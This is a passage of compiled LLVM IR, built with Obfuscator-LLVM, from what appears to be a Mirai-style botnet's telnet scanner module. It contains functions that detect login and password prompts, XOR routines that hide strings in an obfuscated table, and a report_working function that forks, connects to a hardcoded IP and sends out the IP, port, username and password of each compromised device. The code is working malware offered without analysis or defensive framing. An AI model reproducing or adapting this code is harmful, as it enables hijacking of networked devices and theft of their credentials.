  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 26)
  tail call void @table_unlock_val(i8 zeroext 27)
  %12 = call i8* @table_retrieve_val(i32 26, i32* nonnull %2)
  %13 = call i8* @table_retrieve_val(i32 27, i32* nonnull %2)
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, -1
  %18 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %12, i32 %17)
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %.loopexit

; <label>:20:                                     ; preds = %11
  %21 = call i32 @util_memsearch(i8* %14, i32 %15, i8* %13, i32 %17)
  %22 = icmp ne i32 %21, -1
  %..026 = select i1 %22, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8, %8
  %23 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11, %20
  %.1 = phi i32 [ %..026, %20 ], [ 1, %11 ], [ %23, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %24 = icmp eq i32 %.1, -1
  %..1 = select i1 %24, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %4 = load i32, i32* %3, align 4
  %5 = sext i32 %4 to i64
  br label %6

; <label>:6:                                      ; preds = %8, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %8 ], [ %5, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %7 = icmp sgt i64 %indvars.iv, 1
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %10 = load i8, i8* %9, align 1
  switch i8 %10, label %6 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
  ]

; <label>:11:                                     ; preds = %6
  tail call void @table_unlock_val(i8 zeroext 25)
  %12 = call i8* @table_retrieve_val(i32 25, i32* nonnull %2)
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, -1
  %17 = call i32 @util_memsearch(i8* %13, i32 %14, i8* %12, i32 %16)
  %18 = icmp ne i32 %17, -1
  %..020 = select i1 %18, i32 1, i32 -1
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %8, %8, %8, %8
  %19 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %11
  %.1 = phi i32 [ %..020, %11 ], [ %19, %.loopexit.loopexit ]
  call void @table_lock_val(i8 zeroext 25)
  %20 = icmp eq i32 %.1, -1
  %..1 = select i1 %20, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc i32 @consume_any_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #5 {
  %2 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %3 = load i32, i32* %2, align 4
  %4 = sext i32 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %7, %1
  %indvars.iv = phi i64 [ %indvars.iv.next, %7 ], [ %4, %1 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %6 = icmp sgt i64 %indvars.iv, 1
  br i1 %6, label %7, label %11

; <label>:7:                                      ; preds = %5
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %indvars.iv.next
  %9 = load i8, i8* %8, align 1
  %10 = trunc i64 %indvars.iv to i32
  switch i8 %9, label %5 [
    i8 58, label %11
    i8 62, label %11
    i8 36, label %11
    i8 35, label %11
    i8 37, label %11
  ]

; <label>:11:                                     ; preds = %7, %7, %7, %7, %7, %5
  %.0 = phi i32 [ -1, %5 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ], [ %10, %7 ]
  %12 = icmp eq i32 %.0, -1
  %..0 = select i1 %12, i32 0, i32 %.0
  ret i32 %..0
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
  tail call void @table_unlock_val(i8 zeroext 10)
  %3 = call i8* @table_retrieve_val(i32 10, i32* nonnull %2)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, -1
  %9 = call i32 @util_memsearch(i8* %4, i32 %6, i8* %3, i32 %8)
  %10 = icmp eq i32 %9, -1
  call void @table_lock_val(i8 zeroext 10)
  br i1 %10, label %11, label %18

; <label>:11:                                     ; preds = %1
  call void @table_unlock_val(i8 zeroext 9)
  %12 = call i8* @table_retrieve_val(i32 9, i32* nonnull %2)
  %13 = load i32, i32* %5, align 4
  %14 = load i32, i32* %2, align 4
  %15 = add nsw i32 %14, -1
  %16 = call i32 @util_memsearch(i8* %4, i32 %13, i8* %12, i32 %15)
  call void @table_lock_val(i8 zeroext 9)
  %17 = icmp eq i32 %16, -1
  %. = select i1 %17, i32 0, i32 %16
  br label %18

; <label>:18:                                     ; preds = %11, %1
  %.0 = phi i32 [ -1, %1 ], [ %., %11 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @report_working(i32, i16 zeroext, %struct.scanner_auth*) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  %8 = tail call i32 @fork() #10
  %9 = icmp sgt i32 %8, 0
  %10 = icmp eq i32 %8, -1
  %or.cond = or i1 %9, %10
  br i1 %or.cond, label %11, label %12

; <label>:11:                                     ; preds = %3
  ret void

; <label>:12:                                     ; preds = %3
  %13 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  tail call void @exit(i32 0) #12
  unreachable

; <label>:16:                                     ; preds = %12
  tail call void @table_unlock_val(i8 zeroext 2)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = tail call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0)) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  store i32 %18, i32* %19, align 4
  %20 = tail call i8* @table_retrieve_val(i32 2, i32* null)
  %21 = bitcast i8* %20 to i16*
  %22 = load i16, i16* %21, align 2
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  tail call void @table_lock_val(i8 zeroext 2)
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %13, %struct.sockaddr* nonnull %24, i32 16) #10
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %29

; <label>:27:                                     ; preds = %16
  %28 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable

; <label>:29:                                     ; preds = %16
  store i8 0, i8* %7, align 1
  %30 = call i64 @send(i32 %13, i8* nonnull %7, i64 1, i32 16384) #10
  %31 = bitcast i32* %4 to i8*
  %32 = call i64 @send(i32 %13, i8* nonnull %31, i64 4, i32 16384) #10
  %33 = bitcast i16* %5 to i8*
  %34 = call i64 @send(i32 %13, i8* nonnull %33, i64 2, i32 16384) #10
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 4
  %36 = call i64 @send(i32 %13, i8* %35, i64 1, i32 16384) #10
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 0
  %38 = load i8*, i8** %37, align 8
  %39 = load i8, i8* %35, align 4
  %40 = zext i8 %39 to i64
  %41 = call i64 @send(i32 %13, i8* %38, i64 %40, i32 16384) #10
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 5
  %43 = call i64 @send(i32 %13, i8* %42, i64 1, i32 16384) #10
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %2, i64 0, i32 1
  %45 = load i8*, i8** %44, align 8
  %46 = load i8, i8* %42, align 1
  %47 = zext i8 %46 to i64
  %48 = call i64 @send(i32 %13, i8* %45, i64 %47, i32 16384) #10
  %49 = call i32 @close(i32 %13) #10
  call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.scanner_connection* readonly, i8* readnone, i32) unnamed_addr #5 {
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %5 = load i32, i32* %4, align 4
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i8* @deobf(i8*, i32* nocapture) unnamed_addr #0 {
  %3 = tail call i32 @util_strlen(i8* %0) #10
  store i32 %3, i32* %1, align 4
  %4 = add nsw i32 %3, 1
  %5 = sext i32 %4 to i64
  %6 = tail call noalias i8* @malloc(i64 %5) #10
  tail call void @util_memcpy(i8* %6, i8* %0, i32 %4) #10
  %7 = load i32, i32* %1, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %2
  %9 = sext i32 %7 to i64
  %min.iters.check = icmp ult i32 %7, 32
  br i1 %min.iters.check, label %scalar.ph.preheader, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph
  %n.vec = and i64 %9, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %scalar.ph.preheader, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  %10 = add nsw i64 %n.vec, -32
  %11 = lshr exact i64 %10, 5
  %12 = and i64 %11, 1
  %lcmp.mod = icmp eq i64 %12, 0
  br i1 %lcmp.mod, label %vector.body.prol.preheader, label %vector.body.prol.loopexit

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol.preheader
  %13 = bitcast i8* %6 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %13, align 1
  %14 = getelementptr i8, i8* %6, i64 16
  %15 = bitcast i8* %14 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %15, align 1
  %16 = xor <16 x i8> %wide.load.prol, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %17 = xor <16 x i8> %wide.load18.prol, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %18 = bitcast i8* %6 to <16 x i8>*
  store <16 x i8> %16, <16 x i8>* %18, align 1
  %19 = bitcast i8* %14 to <16 x i8>*
  store <16 x i8> %17, <16 x i8>* %19, align 1
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.prol, %vector.body.preheader
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ 32, %vector.body.prol ]
  %20 = icmp eq i64 %11, 0
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.1, %vector.body ]
  %21 = getelementptr inbounds i8, i8* %6, i64 %index
  %22 = bitcast i8* %21 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %22, align 1
  %23 = getelementptr i8, i8* %21, i64 16
  %24 = bitcast i8* %23 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %24, align 1
  %25 = xor <16 x i8> %wide.load, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %26 = xor <16 x i8> %wide.load18, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %27 = bitcast i8* %21 to <16 x i8>*
  store <16 x i8> %25, <16 x i8>* %27, align 1
  %28 = bitcast i8* %23 to <16 x i8>*
  store <16 x i8> %26, <16 x i8>* %28, align 1
  %index.next = add i64 %index, 32
  %29 = getelementptr inbounds i8, i8* %6, i64 %index.next
  %30 = bitcast i8* %29 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %30, align 1
  %31 = getelementptr i8, i8* %29, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %32, align 1
  %33 = xor <16 x i8> %wide.load.1, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %34 = xor <16 x i8> %wide.load18.1, <i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84, i8 84>
  %35 = bitcast i8* %29 to <16 x i8>*
  store <16 x i8> %33, <16 x i8>* %35, align 1
  %36 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %34, <16 x i8>* %36, align 1
  %index.next.1 = add i64 %index, 64
  %37 = icmp eq i64 %index.next.1, %n.vec
  br i1 %37, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !14

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %9, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %scalar.ph.preheader

scalar.ph.preheader:                              ; preds = %middle.block, %min.iters.checked, %.lr.ph
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph ], [ %n.vec, %middle.block ]
  br label %scalar.ph

scalar.ph:                                        ; preds = %scalar.ph.preheader, %scalar.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %scalar.ph ], [ %indvars.iv.ph, %scalar.ph.preheader ]
  %38 = getelementptr inbounds i8, i8* %6, i64 %indvars.iv
  %39 = load i8, i8* %38, align 1
  %40 = xor i8 %39, 84
  store i8 %40, i8* %38, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %41 = icmp slt i64 %indvars.iv.next, %9
  br i1 %41, label %scalar.ph, label %._crit_edge.loopexit, !llvm.loop !15

._crit_edge.loopexit:                             ; preds = %scalar.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %2
  ret i8* %6
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !5, !2, !3}
!5 = !{!"llvm.loop.unroll.runtime.disable"}
!6 = distinct !{!6, !2, !3}
!7 = distinct !{!7, !5, !2, !3}
!8 = !{i32 -2146816763}
!9 = !{i32 -2146816354}
!10 = distinct !{!10, !2, !3}
!11 = distinct !{!11, !12}
!12 = !{!"llvm.loop.unroll.disable"}
!13 = distinct !{!13, !2, !3}
!14 = distinct !{!14, !2, !3}
!15 = distinct !{!15, !5, !2, !3}
